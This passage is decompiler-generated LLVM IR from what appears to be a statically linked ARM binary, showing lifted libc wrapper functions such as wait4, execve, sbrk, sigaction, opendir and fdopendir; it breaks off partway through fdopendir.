define i32 @__default_rt_sa_restorer(%sigcontext* %scp) local_unnamed_addr {
entry:
  %v3_1866c = call i32 @sigreturn(%sigcontext* %scp)
  ret i32 %v3_1866c
}

define i32 @wait4() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_18670 = load i32, i32* @r4, align 4
  store i32 %v3_18670, i32* %stack_var_-8, align 4
  %v0_18674 = call i32 @wait4()
  store i32 %v0_18674, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_18674, -4095
  br i1 %tmp, label %dec_label_pc_18694, label %dec_label_pc_18684

dec_label_pc_18684:                               ; preds = %entry
  %v0_18684 = call i32 @__GI___errno_location()
  %v0_18688 = load i32, i32* %r4.global-to-local, align 4
  %v1_18688 = sub i32 0, %v0_18688
  %v2_1868c = inttoptr i32 %v0_18684 to i32*
  store i32 %v1_18688, i32* %v2_1868c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_18694

dec_label_pc_18694:                               ; preds = %entry, %dec_label_pc_18684
  %v0_18694 = phi i32 [ %v0_18674, %entry ], [ -1, %dec_label_pc_18684 ]
  %v2_18698 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_18698, i32* @r4, align 4
  ret i32 %v0_18694

; uselistorder directives
  uselistorder i32 %v0_18674, { 1, 0, 2 }
  uselistorder i32 ()* @wait4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18694, { 1, 0 }
}

define i32 @__GI_execve() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1869c = load i32, i32* @r4, align 4
  store i32 %v3_1869c, i32* %stack_var_-8, align 4
  %v0_186a0 = load i32, i32* @r0, align 4
  %v1_186a0 = inttoptr i32 %v0_186a0 to i8*
  %v2_186a0 = load i32, i32* @r1, align 4
  %v3_186a0 = inttoptr i32 %v2_186a0 to i8*
  %v4_186a0 = insertvalue [1 x i8*] undef, i8* %v3_186a0, 0
  %v5_186a0 = load i32, i32* @r2, align 4
  %v6_186a0 = inttoptr i32 %v5_186a0 to i8*
  %v7_186a0 = insertvalue [1 x i8*] undef, i8* %v6_186a0, 0
  %v8_186a0 = call i32 @execve(i8* %v1_186a0, [1 x i8*] %v4_186a0, [1 x i8*] %v7_186a0)
  store i32 %v8_186a0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v8_186a0, -4095
  br i1 %tmp, label %bb, label %bb3

bb:                                               ; preds = %entry
  %v6_186b0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v6_186b0, i32* @r4, align 4
  ret i32 %v8_186a0

bb3:                                              ; preds = %entry
  %v0_186b4 = call i32 @__GI___errno_location()
  %v0_186b8 = load i32, i32* %r4.global-to-local, align 4
  %v1_186b8 = sub i32 0, %v0_186b8
  %v2_186bc = inttoptr i32 %v0_186b4 to i32*
  store i32 %v1_186b8, i32* %v2_186bc, align 4
  %v2_186c4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_186c4, i32* @r4, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v8_186a0, { 1, 0, 2 }
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v2_186cc = load i32, i32* @global_var_3467c.1552, align 4
  %v2_186d0 = icmp eq i32 %v2_186cc, 0
  br i1 %v2_186d0, label %bb, label %bb2

bb:                                               ; preds = %entry
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v1_186d8 = phi i32 [ %v2_186cc, %entry ], [ 4096, %bb ]
  ret i32 %v1_186d8

; uselistorder directives
  uselistorder i32* @global_var_3467c.1552, { 2, 1, 4, 0, 3 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %v1_186e4 = load i32, i32* @r0, align 4
  ret i32 %v1_186e4
}

define i32 @__GI_clock_getres(i32 %arg1, %timespec* %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_186e8 = load i32, i32* @r4, align 4
  store i32 %v3_186e8, i32* %stack_var_-8, align 4
  %v4_186ec = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_186ec, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_186ec, -4095
  br i1 %tmp, label %bb, label %bb4

bb:                                               ; preds = %entry
  %v6_186fc = load i32, i32* %stack_var_-8, align 4
  store i32 %v6_186fc, i32* %r4.global-to-local, align 4
  ret i32 %v4_186ec

bb4:                                              ; preds = %entry
  %v0_18700 = call i32 @__GI___errno_location()
  %v0_18704 = load i32, i32* %r4.global-to-local, align 4
  %v1_18704 = sub i32 0, %v0_18704
  %v2_18708 = inttoptr i32 %v0_18700 to i32*
  store i32 %v1_18704, i32* %v2_18708, align 4
  %v2_18710 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_18710, i32* %r4.global-to-local, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v4_186ec, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_18714 = load i32, i32* @r4, align 4
  store i32 %v3_18714, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_18738, label %dec_label_pc_18728

dec_label_pc_18728:                               ; preds = %entry
  %v0_18728 = call i32 @__GI___errno_location()
  %v0_1872c = load i32, i32* %r4.global-to-local, align 4
  %v1_1872c = sub i32 0, %v0_1872c
  %v2_18730 = inttoptr i32 %v0_18728 to i32*
  store i32 %v1_1872c, i32* %v2_18730, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_1873c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_18738

dec_label_pc_18738:                               ; preds = %entry, %dec_label_pc_18728
  %v2_1873c = phi i32 [ %v3_18714, %entry ], [ %v2_1873c.pre, %dec_label_pc_18728 ]
  %v0_18738 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_18728 ]
  store i32 %v2_1873c, i32* @r4, align 4
  ret i32 %v0_18738

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18738, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %v1_18744 = load i32, i32* @r0, align 4
  ret i32 %v1_18744
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_18748 = load i32, i32* @r4, align 4
  store i32 %v3_18748, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i32* @global_var_34690.1588 to i32), i32* %r4.global-to-local, align 4
  %v2_18750 = load i32, i32* @global_var_34690.1588, align 4
  %v2_18754 = icmp eq i32 %v2_18750, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_18754, label %dec_label_pc_18760, label %dec_label_pc_18770

dec_label_pc_18760:                               ; preds = %entry
  %v2_18764 = call i32 @__GI_brk(i32* null)
  %v1_18768 = icmp slt i32 %v2_18764, 0
  br i1 %v1_18768, label %dec_label_pc_18790, label %dec_label_pc_18770thread-pre-split

dec_label_pc_18770thread-pre-split:               ; preds = %dec_label_pc_18760
  %v0_18770.pr = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_18770

dec_label_pc_18770:                               ; preds = %dec_label_pc_18770thread-pre-split, %entry
  %v1_18780 = phi i32 [ %v0_18770.pr, %dec_label_pc_18770thread-pre-split ], [ %arg1, %entry ]
  %v2_18770 = icmp eq i32 %v1_18780, 0
  br i1 %v2_18770, label %bb, label %dec_label_pc_1877c

bb:                                               ; preds = %dec_label_pc_18770
  %v3_18774 = load i32, i32* @global_var_34690.1588, align 4
  store i32 %v3_18774, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_18794

dec_label_pc_1877c:                               ; preds = %dec_label_pc_18770
  %v0_1877c.pre = load i32, i32* %r4.global-to-local, align 4
  %phitmp = inttoptr i32 %v0_1877c.pre to i32*
  %v2_1877c = load i32, i32* %phitmp, align 4
  store i32 %v2_1877c, i32* %r4.global-to-local, align 4
  %v2_18780 = add i32 %v2_1877c, %v1_18780
  %v1_18784 = inttoptr i32 %v2_18780 to i32*
  %v2_18784 = call i32 @__GI_brk(i32* %v1_18784)
  %v1_18788 = icmp slt i32 %v2_18784, 0
  br i1 %v1_18788, label %dec_label_pc_18790, label %dec_label_pc_1877c.dec_label_pc_18794_crit_edge

dec_label_pc_1877c.dec_label_pc_18794_crit_edge:  ; preds = %dec_label_pc_1877c
  %v0_18794.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_18794

dec_label_pc_18790:                               ; preds = %dec_label_pc_1877c, %dec_label_pc_18760
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_18794

dec_label_pc_18794:                               ; preds = %bb, %dec_label_pc_1877c.dec_label_pc_18794_crit_edge, %dec_label_pc_18790
  %v0_18794 = phi i32 [ %v0_18794.pre, %dec_label_pc_1877c.dec_label_pc_18794_crit_edge ], [ %v3_18774, %bb ], [ -1, %dec_label_pc_18790 ]
  %v2_18798 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18798, i32* @r4, align 4
  ret i32 %v0_18794

; uselistorder directives
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder label %dec_label_pc_18794, { 2, 1, 0 }
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %v1_187a4 = load i32, i32* @r0, align 4
  ret i32 %v1_187a4
}

define i32 @munmap() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_187a8 = load i32, i32* @r4, align 4
  store i32 %v3_187a8, i32* %stack_var_-8, align 4
  %v0_187ac = call i32 @munmap()
  store i32 %v0_187ac, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_187ac, -4095
  br i1 %tmp, label %bb, label %bb3

bb:                                               ; preds = %entry
  %v6_187bc = load i32, i32* %stack_var_-8, align 4
  store i32 %v6_187bc, i32* %r4.global-to-local, align 4
  ret i32 %v0_187ac

bb3:                                              ; preds = %entry
  %v0_187c0 = call i32 @__GI___errno_location()
  %v0_187c4 = load i32, i32* %r4.global-to-local, align 4
  %v1_187c4 = sub i32 0, %v0_187c4
  %v2_187c8 = inttoptr i32 %v0_187c0 to i32*
  store i32 %v1_187c4, i32* %v2_187c8, align 4
  %v2_187d0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_187d0, i32* %r4.global-to-local, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v0_187ac, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32 ()* @munmap, { 1, 0 }
}

define i32 @__libc_nanosleep(%timespec* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to %timespec*
  %stack_var_-8 = alloca i32, align 4
  %v3_187d4 = load i32, i32* @r4, align 4
  store i32 %v3_187d4, i32* %stack_var_-8, align 4
  %v6_187d8 = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp)
  store i32 %v6_187d8, i32* %r4.global-to-local, align 4
  %tmp6 = icmp ult i32 %v6_187d8, -4095
  br i1 %tmp6, label %dec_label_pc_187f8, label %dec_label_pc_187e8

dec_label_pc_187e8:                               ; preds = %entry
  %v0_187e8 = call i32 @__GI___errno_location()
  %v0_187ec = load i32, i32* %r4.global-to-local, align 4
  %v1_187ec = sub i32 0, %v0_187ec
  %v2_187f0 = inttoptr i32 %v0_187e8 to i32*
  store i32 %v1_187ec, i32* %v2_187f0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_187f8

dec_label_pc_187f8:                               ; preds = %entry, %dec_label_pc_187e8
  %v0_187f8 = phi i32 [ %v6_187d8, %entry ], [ -1, %dec_label_pc_187e8 ]
  %v2_187fc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_187fc, i32* %r4.global-to-local, align 4
  ret i32 %v0_187f8

; uselistorder directives
  uselistorder i32 %v6_187d8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_187f8, { 1, 0 }
}

define i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg3 to %sigaction*
  %stack_var_-8 = alloca i32, align 4
  %v3_18800 = load i32, i32* @r4, align 4
  store i32 %v3_18800, i32* %stack_var_-8, align 4
  %v7_18804 = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp)
  store i32 %v7_18804, i32* %r4.global-to-local, align 4
  %tmp6 = icmp ult i32 %v7_18804, -4095
  br i1 %tmp6, label %bb, label %bb5

bb:                                               ; preds = %entry
  %v6_18814 = load i32, i32* %stack_var_-8, align 4
  store i32 %v6_18814, i32* %r4.global-to-local, align 4
  ret i32 %v7_18804

bb5:                                              ; preds = %entry
  %v0_18818 = call i32 @__GI___errno_location()
  %v0_1881c = load i32, i32* %r4.global-to-local, align 4
  %v1_1881c = sub i32 0, %v0_1881c
  %v2_18820 = inttoptr i32 %v0_18818 to i32*
  store i32 %v1_1881c, i32* %v2_18820, align 4
  %v2_18828 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_18828, i32* %r4.global-to-local, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v7_18804, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3 }
}

define i32 @__GI_closedir(i32* %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_1882c = load i32, i32* @r4, align 4
  store i32 %v3_1882c, i32* %stack_var_-20, align 4
  %v2_18830 = load i32, i32* %arg1, align 4
  store i32 %v2_18830, i32* %r4.global-to-local, align 4
  %v3_18834 = icmp eq i32 %v2_18830, -1
  %v2_18838 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %tmp, i32* @r6, align 4
  br i1 %v3_18834, label %dec_label_pc_18844, label %dec_label_pc_18858

dec_label_pc_18844:                               ; preds = %entry
  %v0_18844 = call i32 @__GI___errno_location()
  %v0_1884c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1884c, i32* %r2.global-to-local, align 4
  %v2_18850 = inttoptr i32 %v0_18844 to i32*
  store i32 9, i32* %v2_18850, align 4
  %v0_188e4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_188e4

dec_label_pc_18858:                               ; preds = %entry
  %v1_18858 = add i32 %tmp, 24
  store i32 %v1_18858, i32* %r4.global-to-local, align 4
  store i32 %v1_18858, i32* @r2, align 4
  store i32 ptrtoint (i8* @global_var_18078.1329 to i32), i32* @r1, align 4
  store i32 %v2_18838, i32* @r0, align 4
  %v1_18870 = call i32 @_pthread_cleanup_push_defer()
  store i32 -1, i32* @r7, align 4
  %v2_18884 = call i32 @__pthread_return_0(i32 %v1_18858)
  %v0_18888 = load i32, i32* @r6, align 4
  %v1_18888 = inttoptr i32 %v0_18888 to i32*
  %v2_18888 = load i32, i32* %v1_18888, align 4
  store i32 %v2_18888, i32* @r4, align 4
  store i32 1, i32* @r1, align 4
  store i32 %v2_18838, i32* @r0, align 4
  %v0_18898 = load i32, i32* @r7, align 4
  store i32 %v0_18898, i32* %v1_18888, align 4
  %v1_188a0 = call i32 @_pthread_cleanup_pop_restore()
  %v0_188a4 = load i32, i32* @r6, align 4
  %v1_188a4 = add i32 %v0_188a4, 12
  %v2_188a4 = inttoptr i32 %v1_188a4 to i32*
  %v3_188a4 = load i32, i32* %v2_188a4, align 4
  store i32 %v3_188a4, i32* @r0, align 4
  %v0_188a8 = call i32 @free()
  %v0_188ac = load i32, i32* @r6, align 4
  store i32 %v0_188ac, i32* @r0, align 4
  %v0_188b0 = call i32 @free()
  %v0_188b8 = load i32, i32* @r4, align 4
  %v1_188bc = call i32 @close(i32 %v0_188b8)
  store i32 %v1_188bc, i32* %r4.global-to-local, align 4
  %tmp10 = icmp ult i32 %v1_188bc, -4095
  br i1 %tmp10, label %dec_label_pc_188e0, label %dec_label_pc_188d0

dec_label_pc_188d0:                               ; preds = %dec_label_pc_18858
  %v0_188d0 = call i32 @__GI___errno_location()
  %v0_188d4 = load i32, i32* %r4.global-to-local, align 4
  %v1_188d4 = sub i32 0, %v0_188d4
  %v2_188d8 = inttoptr i32 %v0_188d0 to i32*
  store i32 %v1_188d4, i32* %v2_188d8, align 4
  %v0_188dc = load i32, i32* @r7, align 4
  br label %dec_label_pc_188e0

dec_label_pc_188e0:                               ; preds = %dec_label_pc_18858, %dec_label_pc_188d0
  %v0_188e0 = phi i32 [ %v1_188bc, %dec_label_pc_18858 ], [ %v0_188dc, %dec_label_pc_188d0 ]
  store i32 %v0_188e0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_188e4

dec_label_pc_188e4:                               ; preds = %dec_label_pc_18844, %dec_label_pc_188e0
  %v0_188e4 = phi i32 [ %v0_188e4.pre, %dec_label_pc_18844 ], [ %v0_188e0, %dec_label_pc_188e0 ]
  %v2_188ec = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_188ec, i32* %r4.global-to-local, align 4
  ret i32 %v0_188e4

; uselistorder directives
  uselistorder i32 %v1_188bc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_188e4, { 1, 0 }
  uselistorder label %dec_label_pc_188e0, { 1, 0 }
}

define i32 @fd_to_DIR(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_18900 = load i32, i32* @r4, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* @r4, align 4
  %v1_18914 = call i32 @malloc(i32 48)
  %v2_18918 = icmp eq i32 %v1_18914, 0
  br i1 %v2_18918, label %bb, label %dec_label_pc_18924

bb:                                               ; preds = %entry
  br label %dec_label_pc_189ac

dec_label_pc_18924:                               ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_18928 = load i32, i32* @r4, align 4
  %v2_18928 = icmp ugt i32 %v0_18928, 511
  %v2_1892c = add i32 %v1_18914, 4
  %v3_1892c = inttoptr i32 %v2_1892c to i32*
  store i32 0, i32* %v3_1892c, align 4
  %v0_18930 = load i32, i32* %r3.global-to-local, align 4
  %v2_18930 = add i32 %v1_18914, 16
  %v3_18930 = inttoptr i32 %v2_18930 to i32*
  store i32 %v0_18930, i32* %v3_18930, align 4
  %v0_18934 = load i32, i32* %r3.global-to-local, align 4
  %v2_18934 = add i32 %v1_18914, 8
  %v3_18934 = inttoptr i32 %v2_18934 to i32*
  store i32 %v0_18934, i32* %v3_18934, align 4
  br i1 %v2_18928, label %.thread, label %bb15

.thread:                                          ; preds = %dec_label_pc_18924
  %v0_1893c2 = load i32, i32* @r4, align 4
  %v2_1893c3 = add i32 %v1_18914, 20
  %v3_1893c4 = inttoptr i32 %v2_1893c3 to i32*
  store i32 %v0_1893c2, i32* %v3_1893c4, align 4
  br label %bb16

bb15:                                             ; preds = %dec_label_pc_18924
  %v1_18938 = load i32, i32* %r3.global-to-local, align 4
  %v2_18938 = add i32 %v1_18938, 512
  store i32 %v2_18938, i32* %r3.global-to-local, align 4
  %v0_1893c = load i32, i32* @r4, align 4
  %v2_1893c = add i32 %v1_18914, 20
  %v3_1893c = inttoptr i32 %v2_1893c to i32*
  store i32 %v0_1893c, i32* %v3_1893c, align 4
  %v1_18940 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_18940, i32* %v3_1893c, align 4
  br label %bb16

bb16:                                             ; preds = %.thread, %bb15
  store i32 %v1_18914, i32* @r5, align 4
  %v0_18948 = load i32, i32* @r6, align 4
  %v2_18948 = inttoptr i32 %v1_18914 to i32*
  store i32 %v0_18948, i32* %v2_18948, align 4
  %v0_1894c = load i32, i32* @r5, align 4
  %v1_1894c = add i32 %v0_1894c, 20
  %v2_1894c = inttoptr i32 %v1_1894c to i32*
  %v3_1894c = load i32, i32* %v2_1894c, align 4
  store i32 %v3_1894c, i32* %r1.global-to-local, align 4
  %v2_18954 = call i32 @calloc(i32 1, i32 %v3_1894c)
  %v2_18958 = icmp eq i32 %v2_18954, 0
  store i32 %v2_18954, i32* @r4, align 4
  %v1_18960 = load i32, i32* @r5, align 4
  %v2_18960 = add i32 %v1_18960, 12
  %v3_18960 = inttoptr i32 %v2_18960 to i32*
  store i32 %v2_18954, i32* %v3_18960, align 4
  br i1 %v2_18958, label %dec_label_pc_18968, label %dec_label_pc_18978

dec_label_pc_18968:                               ; preds = %bb16
  %v0_18968 = load i32, i32* @r5, align 4
  store i32 %v0_18968, i32* @r0, align 4
  %v0_1896c = call i32 @free()
  %v0_18970 = load i32, i32* @r4, align 4
  br label %dec_label_pc_189ac

dec_label_pc_18978:                               ; preds = %bb16
  store i32 0, i32* %stack_var_-24, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_1899c = load i32, i32* @r5, align 4
  %v1_1899c = add i32 %v0_1899c, 24
  %v1_189a0 = inttoptr i32 %v1_1899c to i32*
  store i32 0, i32* %v1_189a0, align 4
  %v3_189a0 = add i32 %v0_1899c, 28
  %v4_189a0 = inttoptr i32 %v3_189a0 to i32*
  %v5_189a0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_189a0, i32* %v4_189a0, align 4
  %v6_189a0 = add i32 %v0_1899c, 32
  %v7_189a0 = inttoptr i32 %v6_189a0 to i32*
  %v8_189a0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_189a0, i32* %v7_189a0, align 4
  %v9_189a0 = add i32 %v0_1899c, 36
  %v10_189a0 = inttoptr i32 %v9_189a0 to i32*
  %v11_189a0 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_189a0, i32* %v10_189a0, align 4
  %v12_189a0 = add i32 %v0_1899c, 40
  %v2_189a4 = load i32, i32* %stack_var_-24, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_189a8 = inttoptr i32 %v12_189a0 to i32*
  store i32 %v2_189a4, i32* %v1_189a8, align 4
  %v3_189a8 = add i32 %v0_1899c, 44
  %v4_189a8 = inttoptr i32 %v3_189a8 to i32*
  %v5_189a8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_189a8, i32* %v4_189a8, align 4
  %v0_189ac.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_189ac

dec_label_pc_189ac:                               ; preds = %bb, %dec_label_pc_18968, %dec_label_pc_18978
  %v0_189ac = phi i32 [ 0, %bb ], [ %v0_18970, %dec_label_pc_18968 ], [ %v0_189ac.pre, %dec_label_pc_18978 ]
  store i32 %v3_18900, i32* @r4, align 4
  ret i32 %v0_189ac

; uselistorder directives
  uselistorder i32 %v2_18954, { 1, 0, 2 }
  uselistorder i32 %v1_18914, { 2, 1, 5, 0, 6, 4, 3, 7 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_189ac, { 2, 1, 0 }
  uselistorder label %bb16, { 1, 0 }
}

define i32 @__GI_opendir(i8* %arg1) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-100 = alloca i32, align 4
  %v2_189c4 = ptrtoint i32* %stack_var_-100 to i32
  %v4_189c8 = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 542720)
  store i32 %v4_189c8, i32* @r4, align 4
  %tmp = icmp ult i32 %v4_189c8, -4095
  br i1 %tmp, label %dec_label_pc_189e8, label %dec_label_pc_189d8

dec_label_pc_189d8:                               ; preds = %entry
  %v0_189d8 = call i32 @__GI___errno_location()
  %v0_189dc = load i32, i32* @r4, align 4
  %v1_189dc = sub i32 0, %v0_189dc
  %v2_189e0 = inttoptr i32 %v0_189d8 to i32*
  store i32 %v1_189dc, i32* %v2_189e0, align 4
  br label %dec_label_pc_18a08

dec_label_pc_189e8:                               ; preds = %entry
  %v1_189e8 = icmp slt i32 %v4_189c8, 0
  br i1 %v1_189e8, label %dec_label_pc_18a08, label %dec_label_pc_189f0

dec_label_pc_189f0:                               ; preds = %dec_label_pc_189e8
  store i32 %v2_189c4, i32* @r1, align 4
  %v0_189f4 = call i32 @fstat()
  %v1_189f8 = icmp slt i32 %v0_189f4, 0
  br i1 %v1_189f8, label %dec_label_pc_18a00, label %dec_label_pc_18a10

dec_label_pc_18a00:                               ; preds = %dec_label_pc_189f0
  %v0_18a00 = load i32, i32* @r4, align 4
  %v1_18a04 = call i32 @close(i32 %v0_18a00)
  br label %dec_label_pc_18a08

dec_label_pc_18a08:                               ; preds = %dec_label_pc_18a00, %dec_label_pc_189e8, %dec_label_pc_189d8
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_18a48

dec_label_pc_18a10:                               ; preds = %dec_label_pc_189f0
  %v0_18a18 = load i32, i32* @r4, align 4
  %v3_18a1c = call i32 @__GI___fcntl_nocancel(i32 %v0_18a18, i32 2, i32 1)
  %v0_18a20 = load i32, i32* @r4, align 4
  %v2_18a28 = call i32 @fd_to_DIR(i32 %v0_18a20, i32 %tmp2)
  store i32 %v2_18a28, i32* %r5.global-to-local, align 4
  %v2_18a2c = icmp eq i32 %v2_18a28, 0
  br i1 %v2_18a2c, label %dec_label_pc_18a34, label %dec_label_pc_18a48

dec_label_pc_18a34:                               ; preds = %dec_label_pc_18a10
  %v0_18a34 = load i32, i32* @r4, align 4
  %v1_18a38 = call i32 @close(i32 %v0_18a34)
  %v0_18a3c = call i32 @__GI___errno_location()
  %v2_18a44 = inttoptr i32 %v0_18a3c to i32*
  store i32 12, i32* %v2_18a44, align 4
  %v0_18a48.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_18a48

dec_label_pc_18a48:                               ; preds = %dec_label_pc_18a10, %dec_label_pc_18a08, %dec_label_pc_18a34
  %v0_18a48 = phi i32 [ %v2_18a28, %dec_label_pc_18a10 ], [ 0, %dec_label_pc_18a08 ], [ %v0_18a48.pre, %dec_label_pc_18a34 ]
  ret i32 %v0_18a48

; uselistorder directives
  uselistorder i32 %v4_189c8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18a48, { 2, 0, 1 }
}

define i32 @fdopendir(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-100 = alloca i32, align 4
  %v2_18a5c = ptrtoint i32* %stack_var_-100 to i32
  store i32 %v2_18a5c, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_18a68 = call i32 @fstat()
  store i32 %v0_18a68, i32* @r5, align 4
  %v2_18a6c = icmp eq i32 %v0_18a68, 0
  br i1 %v2_18a6c, label %dec_label_pc_18a74, label %dec_label_pc_18adc

dec_label_pc_18a74:                               ; preds = %entry
  %v1_18a78 = and i32 %tmp4, 61440
  store i32 %v1_18a78, i32* @r3, align 4
  %v7_18a7c = icmp eq i32 %v1_18a78, 16384
  br i1 %v7_18a7c, label %dec_label_pc_18a94, label %dec_label_pc_18a84

dec_label_pc_18a84:                               ; preds = %dec_label_pc_18a74
  %v0_18a84 = call i32 @__GI___errno_location()
  br label %dec_label_pc_18ac0

dec_label_pc_18a94:                               ; preds = %dec_label_pc_18a74
  %v0_18a94 = load i32, i32* @r4, align 4
  %v2_18a9c = call i32 @__libc_fcntl(i32 %v0_18a94, i32 3)
  %v7_18aa0 = icmp eq i32 %v2_18a9c, -1
  br i1 %v7_18aa0, label %dec_label_pc_18adc, label %dec_label_pc_18aa8

dec_label_pc_18aa8:                               ; preds = %dec_label_pc_18a94
  %v1_18aa8 = urem i32 %v2_18a9c, 4
  %v7_18aac = icmp eq i32 %v1_18aa8, 1
  br i1 %v7_18aac, label %dec_label_pc_18ab4, label %dec_label_pc_18ac8

dec_label_pc_18ab4:                               ; preds = %dec_label_pc_18aa8
  %v0_18ab4 = call i32 @__GI___errno_location()
  br label %dec_label_pc_18ac0

dec_label_pc_18ac0:                               ; preds = %dec_label_pc_18a84, %dec_label_pc_18ab4
  %storemerge2 = phi i32 [ %v0_18a84, %dec_label_pc_18a84 ], [ %v0_18ab4, %dec_label_pc_18ab4 ]
  %storemerge = phi i32 [ 20, %dec_label_pc_18a84 ], [ 22, %dec_label_pc_18ab4 ]
  %storemerge1 = load i32, i32* @r5, align 4
  store i32 %storemerge1, i32* %r2.global-to-local, align 4
  %v2_18ac0 = inttoptr i32 %storemerge2 to i32*
  store i32 %storemerge, i32* %v2_18ac0, align 4
  %v0_18ae0.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18ae0

dec_label_pc_18ac8:                               ; preds = %dec_label_pc_18aa8
